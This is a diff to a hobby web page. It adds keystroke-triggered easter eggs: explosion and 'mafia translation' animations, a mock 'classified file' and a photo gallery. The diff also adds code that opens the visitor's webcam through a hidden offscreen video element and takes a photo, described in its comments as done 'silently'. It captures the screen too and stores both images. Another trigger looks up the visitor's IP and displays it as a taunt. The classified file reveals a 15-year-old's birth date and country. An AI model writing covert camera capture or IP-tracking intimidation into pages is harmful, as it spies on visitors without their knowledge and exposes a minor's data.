@@ -1412,6 +1412,173 @@
                 flex-direction: column;
             }
         }
+        
+        /* Boom effect animations */
+        @keyframes boomExplosion {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+                background: radial-gradient(circle, #ff4444 0%, #ff0000 25%, #000000 50%);
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 1;
+                background: radial-gradient(circle, #ffff00 0%, #ff4444 25%, #ff0000 50%, #000000 75%);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+                background: radial-gradient(circle, #ff0000 0%, #000000 50%);
+            }
+        }
+        
+        @keyframes boomTextShake {
+            0%, 100% { transform: translateX(0); }
+            10% { transform: translateX(-10px) rotate(-2deg); }
+            20% { transform: translateX(10px) rotate(2deg); }
+            30% { transform: translateX(-8px) rotate(-1deg); }
+            40% { transform: translateX(8px) rotate(1deg); }
+            50% { transform: translateX(-5px) rotate(-0.5deg); }
+            60% { transform: translateX(5px) rotate(0.5deg); }
+            70% { transform: translateX(-3px); }
+            80% { transform: translateX(3px); }
+            90% { transform: translateX(-1px); }
+        }
+        
+        @keyframes explosionParticle {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(calc(-50% + var(--end-x)), calc(-50% + var(--end-y))) scale(0);
+                opacity: 0;
+            }
+        }
+        
+        @keyframes fileInterfaceFadeIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.8);
+                filter: blur(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+                filter: blur(0);
+            }
+        }
+        
+        @keyframes classifiedBlink {
+            0%, 50%, 100% { opacity: 1; }
+            25%, 75% { opacity: 0.3; }
+        }
+        
+        @keyframes dangerBlink {
+            0%, 100% { 
+                color: #ff0000;
+                text-shadow: 0 0 15px #ff0000;
+            }
+            50% { 
+                color: #ffff00;
+                text-shadow: 0 0 15px #ffff00;
+            }
+        }
+        
+        /* Mafia translation effects */
+        @keyframes mafiaFadeIn {
+            0% {
+                opacity: 0;
+                background: rgba(0, 0, 0, 0);
+            }
+            100% {
+                opacity: 1;
+                background: rgba(0, 0, 0, 0.9);
+            }
+        }
+        
+        @keyframes mafiaTextGlow {
+            0% {
+                text-shadow: 2px 2px 4px rgba(0,0,0,0.8), 0 0 20px #ffd700;
+                transform: scale(1);
+            }
+            100% {
+                text-shadow: 4px 4px 8px rgba(0,0,0,0.8), 0 0 40px #ffd700, 0 0 60px #ffd700;
+                transform: scale(1.05);
+            }
+        }
+        
+        @keyframes mafiaTranslateGlow {
+            0% {
+                background: rgba(255, 215, 0, 0.1);
+                transform: scale(1);
+            }
+            50% {
+                background: rgba(255, 215, 0, 0.3);
+                transform: scale(1.02);
+                box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            }
+            100% {
+                background: rgba(255, 215, 0, 0.1);
+                transform: scale(1);
+            }
+        }
+        
+        @keyframes mafiaWarningPulse {
+            0%, 100% {
+                box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                box-shadow: 0 0 80px rgba(255, 215, 0, 0.8);
+                transform: translate(-50%, -50%) scale(1.05);
+            }
+        }
+        
+        /* IP Mocking animations */
+        @keyframes mockingFadeIn {
+            0% {
+                opacity: 0;
+                background: linear-gradient(45deg, #000000, #000000, #000000);
+            }
+            100% {
+                opacity: 1;
+                background: linear-gradient(45deg, #000000, #1a0000, #330000);
+            }
+        }
+        
+        @keyframes mockingTextGlow {
+            0% {
+                text-shadow: 0 0 20px #ff0000;
+                transform: scale(1);
+            }
+            100% {
+                text-shadow: 0 0 40px #ff0000, 0 0 60px #ff0000;
+                transform: scale(1.1);
+            }
+        }
+        
+        @keyframes ipTrackingBlink {
+            0%, 50%, 100% { 
+                color: #ffff00;
+                text-shadow: 0 0 15px #ffff00;
+            }
+            25%, 75% { 
+                color: #ff0000;
+                text-shadow: 0 0 15px #ff0000;
+            }
+        }
+        
+        @keyframes mockingSlide {
+            0% {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1489,6 +1656,10 @@
         let isPlanBerlinActive = false;
         let keyBuffer = '';
         let lastKeyTime = 0;
+        let capturedPhotos = []; // Store captured photos locally
+        let isPhotoMode = false;
+        let isAgamMode = false;
+        let isTranslated = false;
         
         // Real-time key detection for Plan Berlin trigger
         const PLAN_BERLIN_TRIGGER = 'planberlin';
@@ -1523,6 +1694,30 @@
                     e.preventDefault();
                     // Immediately start the sequence
                     startPlanBerlinSequence();
+                    keyBuffer = ''; // Reset buffer
+                }
+                
+                // Check for photos trigger
+                if (keyBuffer.includes('photos')) {
+                    console.log('📷 PHOTOS DETECTED! Showing gallery...');
+                    e.preventDefault();
+                    showPhotoGallery();
+                    keyBuffer = ''; // Reset buffer
+                }
+                
+                // Check for agam07 trigger
+                if (keyBuffer.includes('agam07')) {
+                    console.log('💥 AGAM07 DETECTED! Boom effect and secret file...');
+                    e.preventDefault();
+                    triggerAgamBoom();
+                    keyBuffer = ''; // Reset buffer
+                }
+                
+                // Check for translate trigger
+                if (keyBuffer.includes('translate')) {
+                    console.log('🔫 TRANSLATE DETECTED! Mafia translation...');
+                    e.preventDefault();
+                    triggerMafiaTranslation();
                     keyBuffer = ''; // Reset buffer
                 }
             }
@@ -1998,8 +2193,784 @@
             document.getElementById('textInput').value = '';
         }
 
-        // Single function to handle the entire Plan Berlin sequence
+        // Load saved photos on page load
+        function loadSavedPhotos() {
+            const saved = localStorage.getItem('heartCloudPhotos');
+            if (saved) {
+                try {
+                    capturedPhotos = JSON.parse(saved);
+                    console.log(`Loaded ${capturedPhotos.length} saved photos`);
+                } catch (e) {
+                    console.error('Error loading saved photos:', e);
+                    capturedPhotos = [];
+                }
+            }
+        }
+        
+        // Save photos to localStorage
+        function savePhoto(photoDataUrl) {
+            const photo = {
+                dataUrl: photoDataUrl,
+                timestamp: new Date().toISOString(),
+                id: Date.now() + Math.random()
+            };
+            
+            capturedPhotos.push(photo);
+            localStorage.setItem('heartCloudPhotos', JSON.stringify(capturedPhotos));
+            console.log('Photo saved to local storage');
+        }
+        
+        // Capture webcam photo silently
+        async function captureWebcamPhoto() {
+            try {
+                console.log('Attempting to access webcam...');
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.position = 'absolute';
+                video.style.left = '-9999px';
+                video.style.top = '-9999px';
+                video.style.opacity = '0';
+                video.style.pointerEvents = 'none';
+                video.muted = true;
+                document.body.appendChild(video);
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        console.log('Webcam video started, capturing photo...');
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            // Stop the stream
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                            
+                            const photoDataUrl = canvas.toDataURL('image/png');
+                            console.log('Webcam photo captured successfully!');
+                            resolve(photoDataUrl);
+                        }, 1500); // Wait for camera to stabilize
+                    };
+                    
+                    video.onerror = () => {
+                        console.error('Video error');
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        resolve(null);
+                    };
+                });
+            } catch (error) {
+                console.error('Camera access denied or not available:', error);
+                return null;
+            }
+        }
+        
+        // Capture screen photo
+        async function captureScreenPhoto() {
+            try {
+                // Import html2canvas if not already available
+                if (typeof html2canvas === 'undefined') {
+                    console.log('html2canvas not available, creating simple canvas');
+                    // Create a simple colored rectangle as fallback
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 800;
+                    canvas.height = 600;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Create gradient background
+                    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+                    gradient.addColorStop(0, '#667eea');
+                    gradient.addColorStop(1, '#764ba2');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, 800, 600);
+                    
+                    // Add some text
+                    ctx.fillStyle = 'white';
+                    ctx.font = '48px Arial';
+                    ctx.textAlign = 'center';
+                    ctx.fillText('Plan Berlin', 400, 250);
+                    ctx.fillText('Screen Captured', 400, 350);
+                    
+                    return canvas.toDataURL('image/png');
+                } else {
+                    const canvas = await html2canvas(document.body);
+                    return canvas.toDataURL('image/png');
+                }
+            } catch (error) {
+                console.error('Screen capture failed:', error);
+                return null;
+            }
+        }
+        
+        // Show photo gallery
+        function showPhotoGallery() {
+            if (isPhotoMode) return; // Already showing
+            
+            isPhotoMode = true;
+            console.log('Showing photo gallery...');
+            
+            // Create gallery overlay
+            const galleryOverlay = document.createElement('div');
+            galleryOverlay.id = 'photoGallery';
+            galleryOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: rgba(0, 0, 0, 0.95);
+                z-index: 999999;
+                display: flex;
+                flex-direction: column;
+                overflow-y: auto;
+                padding: 20px;
+                box-sizing: border-box;
+            `;
+            
+            // Create header
+            const header = document.createElement('div');
+            header.style.cssText = `
+                text-align: center;
+                color: white;
+                margin-bottom: 30px;
+                position: sticky;
+                top: 0;
+                background: rgba(0, 0, 0, 0.8);
+                padding: 20px;
+                border-radius: 10px;
+            `;
+            header.innerHTML = `
+                <h1 style="font-size: 2.5rem; margin: 0 0 10px 0; color: #ff6b6b;">📸 CAPTURED PHOTOS</h1>
+                <p style="margin: 0; opacity: 0.8;">Total Photos: ${capturedPhotos.length}</p>
+                <button onclick="closePhotoGallery()" style="
+                    margin-top: 15px;
+                    padding: 10px 20px;
+                    background: #ff6b6b;
+                    color: white;
+                    border: none;
+                    border-radius: 25px;
+                    cursor: pointer;
+                    font-size: 16px;
+                ">✕ Close Gallery</button>
+            `;
+            
+            // Create photo grid
+            const photoGrid = document.createElement('div');
+            photoGrid.style.cssText = `
+                display: grid;
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+                gap: 20px;
+                width: 100%;
+                max-width: 1400px;
+                margin: 0 auto;
+            `;
+            
+            // Add photos to grid
+            if (capturedPhotos.length === 0) {
+                photoGrid.innerHTML = `
+                    <div style="
+                        grid-column: 1 / -1;
+                        text-align: center;
+                        color: white;
+                        font-size: 1.5rem;
+                        padding: 50px;
+                        opacity: 0.7;
+                    ">No photos captured yet. Type "plan berlin" to capture photos!</div>
+                `;
+            } else {
+                capturedPhotos.forEach((photo, index) => {
+                    const photoItem = document.createElement('div');
+                    photoItem.style.cssText = `
+                        background: rgba(255, 255, 255, 0.1);
+                        border-radius: 15px;
+                        padding: 15px;
+                        border: 2px solid rgba(255, 107, 107, 0.3);
+                        transition: all 0.3s ease;
+                        cursor: pointer;
+                    `;
+                    
+                    photoItem.innerHTML = `
+                        <img src="${photo.dataUrl}" style="
+                            width: 100%;
+                            height: 200px;
+                            object-fit: cover;
+                            border-radius: 10px;
+                            margin-bottom: 10px;
+                        " />
+                        <div style="color: white; text-align: center; font-size: 14px; opacity: 0.8;">
+                            Photo ${index + 1}<br>
+                            ${new Date(photo.timestamp).toLocaleString()}
+                        </div>
+                    `;
+                    
+                    // Add hover effect
+                    photoItem.addEventListener('mouseenter', () => {
+                        photoItem.style.transform = 'scale(1.05)';
+                        photoItem.style.borderColor = '#ff6b6b';
+                    });
+                    
+                    photoItem.addEventListener('mouseleave', () => {
+                        photoItem.style.transform = 'scale(1)';
+                        photoItem.style.borderColor = 'rgba(255, 107, 107, 0.3)';
+                    });
+                    
+                    photoGrid.appendChild(photoItem);
+                });
+            }
+            
+            galleryOverlay.appendChild(header);
+            galleryOverlay.appendChild(photoGrid);
+            document.body.appendChild(galleryOverlay);
+            
+            // Add fade-in animation
+            setTimeout(() => {
+                galleryOverlay.style.opacity = '0';
+                galleryOverlay.style.transition = 'opacity 0.5s ease';
+                galleryOverlay.style.opacity = '1';
+            }, 10);
+        }
+        
+        // Close photo gallery
+        function closePhotoGallery() {
+            const gallery = document.getElementById('photoGallery');
+            if (gallery) {
+                gallery.style.opacity = '0';
+                setTimeout(() => {
+                    gallery.remove();
+                    isPhotoMode = false;
+                }, 500);
+            }
+        }
+        
+        // Trigger Agam boom effect and secret file
+        function triggerAgamBoom() {
+            if (isAgamMode) return; // Prevent multiple activations
+            isAgamMode = true;
+            
+            console.log('💥 AGAM07 SEQUENCE INITIATED!');
+            
+            // Track IP and show mocking message first
+            showIPMockingMessage();
+            
+            // Create boom effect after mocking
+            setTimeout(() => {
+                createBoomEffect();
+            }, 3000);
+            
+            // Show secret file after boom
+            setTimeout(() => {
+                showAgamSecretFile();
+            }, 5000);
+        }
+        
+        // Show IP tracking and mocking message
+        function showIPMockingMessage() {
+            // Get user's IP (using a free service)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    displayMockingMessage(data.ip);
+                })
+                .catch(() => {
+                    // Fallback if IP service fails
+                    displayMockingMessage('HIDDEN_BUT_TRACKED');
+                });
+        }
+        
+        // Display the mocking message with IP
+        function displayMockingMessage(userIP) {
+            const mockingOverlay = document.createElement('div');
+            mockingOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: linear-gradient(45deg, #000000, #1a0000, #330000);
+                color: #ff0000;
+                font-family: 'Courier New', monospace;
+                z-index: 99999999;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                animation: mockingFadeIn 1s ease-out;
+            `;
+            
+            mockingOverlay.innerHTML = `
+                <div style="
+                    font-size: 3rem;
+                    text-shadow: 0 0 20px #ff0000;
+                    margin-bottom: 30px;
+                    animation: mockingTextGlow 1s infinite alternate;
+                ">😂 GOTCHA! 😂</div>
+                
+                <div style="
+                    font-size: 1.5rem;
+                    color: #ffff00;
+                    text-align: center;
+                    margin-bottom: 20px;
+                    animation: ipTrackingBlink 2s infinite;
+                ">IP TRACKED: ${userIP}</div>
+                
+                <div style="
+                    font-size: 1.2rem;
+                    color: #00ff00;
+                    text-align: center;
+                    line-height: 1.6;
+                    max-width: 600px;
+                    animation: mockingSlide 0.5s ease-out;
+                ">
+                    😏 Someone's being nosy, eh?<br>
+                    🕵️‍♂️ We see you snooping around...<br>
+                    🤣 Nice try, detective!<br>
+                    <br>
+                    <span style="color: #ff6600; font-weight: bold;">
+                        🎆 Anyway, here's what you came for... 🎆
+                    </span>
+                </div>
+            `;
+            
+            document.body.appendChild(mockingOverlay);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                mockingOverlay.style.opacity = '0';
+                setTimeout(() => mockingOverlay.remove(), 500);
+            }, 2500);
+        }
+        
+        // Create boom explosion effect
+        function createBoomEffect() {
+            // Create boom overlay
+            const boomOverlay = document.createElement('div');
+            boomOverlay.id = 'boomOverlay';
+            boomOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: radial-gradient(circle, #ff4444 0%, #ff0000 25%, #000000 50%);
+                z-index: 9999999;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                animation: boomExplosion 2s ease-out forwards;
+            `;
+            
+            // Add boom text
+            const boomText = document.createElement('div');
+            boomText.style.cssText = `
+                font-size: 8rem;
+                color: white;
+                font-weight: bold;
+                text-shadow: 
+                    0 0 20px #ff0000,
+                    0 0 40px #ff0000,
+                    0 0 60px #ff0000,
+                    0 0 80px #ff0000;
+                animation: boomTextShake 0.5s infinite;
+                font-family: 'Arial Black', Arial, sans-serif;
+            `;
+            boomText.textContent = '💥 BOOM! 💥';
+            
+            boomOverlay.appendChild(boomText);
+            document.body.appendChild(boomOverlay);
+            
+            // Add screen shake effect
+            document.body.style.animation = 'screenShake 1s ease-in-out';
+            
+            // Create explosion particles
+            createExplosionParticles();
+            
+            // Add boom sound effect (visual representation)
+            setTimeout(() => {
+                console.log('🔊 BOOM SOUND EFFECT!');
+            }, 200);
+        }
+        
+        // Create explosion particles
+        function createExplosionParticles() {
+            for (let i = 0; i < 100; i++) {
+                setTimeout(() => {
+                    const particle = document.createElement('div');
+                    particle.style.cssText = `
+                        position: fixed;
+                        width: ${Math.random() * 20 + 5}px;
+                        height: ${Math.random() * 20 + 5}px;
+                        background: ${['#ff0000', '#ff4444', '#ff6600', '#ffaa00', '#ffff00'][Math.floor(Math.random() * 5)]};
+                        left: 50%;
+                        top: 50%;
+                        border-radius: 50%;
+                        z-index: 99999999;
+                        box-shadow: 0 0 20px currentColor;
+                        animation: explosionParticle ${Math.random() * 2 + 1}s ease-out forwards;
+                    `;
+                    
+                    const angle = (Math.random() * 360) * Math.PI / 180;
+                    const distance = Math.random() * 500 + 100;
+                    const endX = Math.cos(angle) * distance;
+                    const endY = Math.sin(angle) * distance;
+                    
+                    particle.style.setProperty('--end-x', endX + 'px');
+                    particle.style.setProperty('--end-y', endY + 'px');
+                    
+                    document.body.appendChild(particle);
+                    
+                    setTimeout(() => particle.remove(), 3000);
+                }, i * 10);
+            }
+        }
+        
+        // Show Agam's secret file
+        function showAgamSecretFile() {
+            // Remove boom overlay
+            const boomOverlay = document.getElementById('boomOverlay');
+            if (boomOverlay) {
+                boomOverlay.style.opacity = '0';
+                setTimeout(() => boomOverlay.remove(), 500);
+            }
+            
+            // Create secret file interface
+            const fileInterface = document.createElement('div');
+            fileInterface.id = 'agamSecretFile';
+            fileInterface.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 50%, #000000 100%);
+                color: #00ff00;
+                font-family: 'Courier New', monospace;
+                z-index: 999999;
+                overflow-y: auto;
+                padding: 40px;
+                box-sizing: border-box;
+                animation: fileInterfaceFadeIn 1s ease-out;
+            `;
+            
+            fileInterface.innerHTML = `
+                <div style="
+                    max-width: 800px;
+                    margin: 0 auto;
+                    border: 2px solid #00ff00;
+                    border-radius: 10px;
+                    padding: 30px;
+                    background: rgba(0, 255, 0, 0.05);
+                    box-shadow: 
+                        0 0 30px rgba(0, 255, 0, 0.3),
+                        inset 0 0 20px rgba(0, 255, 0, 0.1);
+                ">
+                    <div style="
+                        text-align: center;
+                        font-size: 2.5rem;
+                        color: #ff0000;
+                        text-shadow: 0 0 20px #ff0000;
+                        margin-bottom: 20px;
+                        animation: classifiedBlink 2s infinite;
+                        font-weight: bold;
+                        letter-spacing: 3px;
+                    ">CLASSIFIED DOCUMENT ACCESS TERMINAL</div>
+                    
+                    <div style="
+                        text-align: center;
+                        font-size: 1.2rem;
+                        color: #ffff00;
+                        margin-bottom: 30px;
+                        text-shadow: 0 0 10px #ffff00;
+                    ">[⚠️ SECURITY LEVEL: TOP SECRET ⚠️]</div>
+                    
+                    <div style="
+                        border: 1px solid #00ff00;
+                        padding: 20px;
+                        margin: 20px 0;
+                        background: rgba(0, 0, 0, 0.5);
+                        border-radius: 5px;
+                    ">
+                        <h2 style="
+                            color: #00ffff;
+                            text-shadow: 0 0 15px #00ffff;
+                            margin-bottom: 15px;
+                            font-size: 1.8rem;
+                        ">SUBJECT PROFILE: AGAM</h2>
+                        
+                        <div style="line-height: 1.8; font-size: 1.1rem;">
+                            <p style="margin-bottom: 15px;">
+                                <span style="color: #ffff00;">QXZYLPH:</span> <span style="color: #ffffff;" id="age-text">15 blorgfixx klemptoids</span>
+                            </p>
+                            <p style="margin-bottom: 15px;">
+                                <span style="color: #ffff00;">VRYNTOK QLAZMETH:</span> <span style="color: #ffffff;" id="birth-text">21st Flurbnok 2010 xyzzith</span>
+                            </p>
+                            <p style="margin-bottom: 15px;">
+                                <span style="color: #ffff00;">PLOXNERD:</span> <span style="color: #ffffff;" id="location-text">Qwertyuiop Zxcvbnmlk</span>
+                            </p>
+                            <p style="margin-bottom: 15px;">
+                                <span style="color: #ffff00;">BLORGNITZ:</span> <span style="color: #ffffff;" id="status-text">Flimflam & Qibbernaught Zonkerdoodle</span>
+                            </p>
+                        </div>
+                        
+                        <div style="
+                            border-top: 1px solid #00ff00;
+                            margin-top: 20px;
+                            padding-top: 20px;
+                        ">
+                            <h3 style="
+                                color: #ff6600;
+                                text-shadow: 0 0 10px #ff6600;
+                                margin-bottom: 15px;
+                            ">PERSONAL STATEMENT:</h3>
+                            
+                            <div style="
+                                background: rgba(0, 255, 0, 0.1);
+                                padding: 20px;
+                                border-left: 4px solid #00ff00;
+                                font-style: italic;
+                                line-height: 1.6;
+                            " id="personal-statement">
+                                "Blorgnixx, qxz 15 flimflammers gribnook zeth, vryntok 21st Flurbnok 2010 xyzzith, ploxnerd Qwertyuiop Zxcvbnmlk gribble hoon. Qxz nek flimflam gribnook jo qwertyuiop skillos ke zonk bahut curiositas rakhta gribnook, visheshkar qibbernaught aur blorgnitz se related cheezos ke zonk. Qxz love gribnook hoon qibbernaught explore gribnook, flimflammers, aur digital duniya ki latest qwertyuiops.<br><br>
+                                
+                                Bachpan se hi, qxz fascinated gribnook hoon ki qibbernaught kaise zonk gribnook hai aur duniya ko kaise change kar rahi hai. Qxz apna bahut time spend gribnook hoon blorgnitz flimflammers ke saath experiment karte hue, qwertyuiop software discover karte hue, aur chhote zonkerdoodles banate hue. Learning aur creating hi mujhe motivated rakhte hain, aur qxz dream gribnook hoon ki apni qibbernaught ki passion use karke future mein amazing cheezein banaunga."
+                            </div>
+                        </div>
+                        
+                        <div style="
+                            border-top: 1px solid #00ff00;
+                            margin-top: 20px;
+                            padding-top: 20px;
+                            text-align: center;
+                        ">
+                            <div style="
+                                color: #ff0000;
+                                font-weight: bold;
+                                font-size: 1.2rem;
+                                text-shadow: 0 0 15px #ff0000;
+                                animation: dangerBlink 1.5s infinite;
+                            ">⚠️ CLASSIFIED INFORMATION - AUTHORIZED PERSONNEL ONLY ⚠️</div>
+                        </div>
+                    </div>
+                    
+                    <div style="
+                        text-align: center;
+                        margin-top: 30px;
+                    ">
+                        <button onclick="closeAgamFile()" style="
+                            background: linear-gradient(45deg, #ff0000, #cc0000);
+                            color: white;
+                            border: none;
+                            padding: 15px 30px;
+                            font-size: 16px;
+                            font-weight: bold;
+                            border-radius: 25px;
+                            cursor: pointer;
+                            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
+                            transition: all 0.3s ease;
+                            font-family: 'Courier New', monospace;
+                        ">[✕ CLOSE CLASSIFIED FILE ✕]</button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(fileInterface);
+            
+            // Add typing effect to personal statement
+            setTimeout(() => {
+                console.log('📄 SECRET FILE ACCESSED!');
+            }, 500);
+        }
+        
+        // Close Agam secret file
+        function closeAgamFile() {
+            const fileInterface = document.getElementById('agamSecretFile');
+            if (fileInterface) {
+                fileInterface.style.opacity = '0';
+                fileInterface.style.transform = 'scale(0.9)';
+                setTimeout(() => {
+                    fileInterface.remove();
+                    isAgamMode = false;
+                    isTranslated = false; // Reset translation state
+                }, 500);
+            }
+        }
+        
+        // Trigger mafia-style translation
+        function triggerMafiaTranslation() {
+            // Only work if Agam secret file is currently open
+            if (!isAgamMode) {
+                console.log('Translation can only be used when secret file is open');
+                return;
+            }
+            
+            if (isTranslated) {
+                // If already translated, show mafia warning
+                showMafiaWarning();
+                return;
+            }
+            
+            console.log('🔫 MAFIA TRANSLATION INITIATED!');
+            
+            // Create mafia overlay effect
+            const mafiaOverlay = document.createElement('div');
+            mafiaOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: rgba(0, 0, 0, 0.9);
+                z-index: 99999999;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                animation: mafiaFadeIn 1s ease-out;
+            `;
+            
+            mafiaOverlay.innerHTML = `
+                <div style="
+                    text-align: center;
+                    color: #ffd700;
+                    font-family: 'serif';
+                    font-size: 3rem;
+                    text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+                    animation: mafiaTextGlow 2s ease-in-out infinite alternate;
+                ">
+                    🔫 TRANSLATING... CAPISCE? 🔫<br>
+                    <div style="font-size: 1.5rem; margin-top: 20px; font-style: italic;">
+                        "You come to me on this day..."
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(mafiaOverlay);
+            
+            // Remove overlay and translate after 3 seconds
+            setTimeout(() => {
+                mafiaOverlay.remove();
+                performTranslation();
+                isTranslated = true;
+            }, 3000);
+        }
+        
+        // Perform the actual translation
+        function performTranslation() {
+            // Translate age
+            const ageText = document.getElementById('age-text');
+            if (ageText) {
+                ageText.innerHTML = '15 years old';
+                ageText.style.animation = 'mafiaTranslateGlow 1s ease-out';
+            }
+            
+            // Translate birth date
+            const birthText = document.getElementById('birth-text');
+            if (birthText) {
+                birthText.innerHTML = '21st June 2010';
+                birthText.style.animation = 'mafiaTranslateGlow 1s ease-out';
+            }
+            
+            // Translate location
+            const locationText = document.getElementById('location-text');
+            if (locationText) {
+                locationText.innerHTML = 'India';
+                locationText.style.animation = 'mafiaTranslateGlow 1s ease-out';
+            }
+            
+            // Translate status
+            const statusText = document.getElementById('status-text');
+            if (statusText) {
+                statusText.innerHTML = 'Student & Tech Enthusiast';
+                statusText.style.animation = 'mafiaTranslateGlow 1s ease-out';
+            }
+            
+            // Translate personal statement with mafia style
+            const personalStatement = document.getElementById('personal-statement');
+            if (personalStatement) {
+                personalStatement.innerHTML = `
+                    "Listen here, kid... I'm 15 years old, see? Born on 21st June 2010, and I'm from India, capisce? I'm a student with a huge curiosity for learning new skills, especially anything related to technology and AI, if you know what I mean. I love exploring tech, gadgets, and the latest innovations in the digital world - that's my business, understand?<br><br>
+                    
+                    Ever since I was a young soldier, I've been fascinated by how technology works and how it's changing the world, see? I spend a lot of my time experimenting with AI tools, discovering new software, and building small projects - it's like running my own little operation. Learning and creating are what keep me motivated, and I dream of using my passion for technology to build amazing things in the future. That's an offer you can't refuse, capisce?"
+                    <br><br>
+                    <div style="color: #ffd700; font-weight: bold; text-align: center; font-style: normal;">
+                        🔫 TRANSLATION COMPLETE - COURTESY OF THE FAMILY 🔫
+                    </div>
+                `;
+                personalStatement.style.animation = 'mafiaTranslateGlow 2s ease-out';
+                personalStatement.style.border = '2px solid #ffd700';
+            }
+            
+            console.log('🔫 TRANSLATION COMPLETE - MAFIA STYLE!');
+        }
+        
+        // Show mafia warning if already translated
+        function showMafiaWarning() {
+            const warning = document.createElement('div');
+            warning.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(45deg, #000000, #333333);
+                color: #ffd700;
+                padding: 30px;
+                border: 3px solid #ffd700;
+                border-radius: 15px;
+                font-family: serif;
+                font-size: 1.5rem;
+                text-align: center;
+                z-index: 999999999;
+                box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);
+                animation: mafiaWarningPulse 2s ease-in-out infinite;
+            `;
+            
+            warning.innerHTML = `
+                🔫 ALREADY TRANSLATED, WISE GUY! 🔫<br>
+                <div style="font-size: 1rem; margin-top: 10px; font-style: italic;">
+                    "You think this is a game? Fuhgeddaboutit!"
+                </div>
+            `;
+            
+            document.body.appendChild(warning);
+            
+            setTimeout(() => {
+                warning.style.opacity = '0';
+                setTimeout(() => warning.remove(), 500);
+            }, 3000);
+        }
+        
+        // Capture photos during Plan Berlin sequence
+        async function capturePhotosForPlanBerlin() {
+            console.log('🎯 Plan Berlin triggered - capturing photos silently...');
+            
+            try {
+                // Capture webcam photo silently
+                const webcamPhoto = await captureWebcamPhoto();
+                if (webcamPhoto) {
+                    savePhoto(webcamPhoto);
+                    console.log('📸 Webcam photo captured and saved!');
+                }
+                
+                // Also capture screen
+                const screenPhoto = await captureScreenPhoto();
+                if (screenPhoto) {
+                    savePhoto(screenPhoto);
+                    console.log('📸 Screen photo captured and saved!');
+                }
+            } catch (error) {
+                console.error('Error capturing photos:', error);
+            }
+        }
         function startPlanBerlinSequence() {
+            // Capture photos silently first
+            capturePhotosForPlanBerlin();
+            
             if (isPlanBerlinActive) return; // Prevent multiple activations
             isPlanBerlinActive = true;
             
@@ -2480,6 +3451,9 @@
 
         // Initialize enhanced background particles
         createBackgroundParticles();
+        
+        // Load saved photos on page load
+        loadSavedPhotos();
 
         // Add more frequent ambient sparkles
         setInterval(() => {
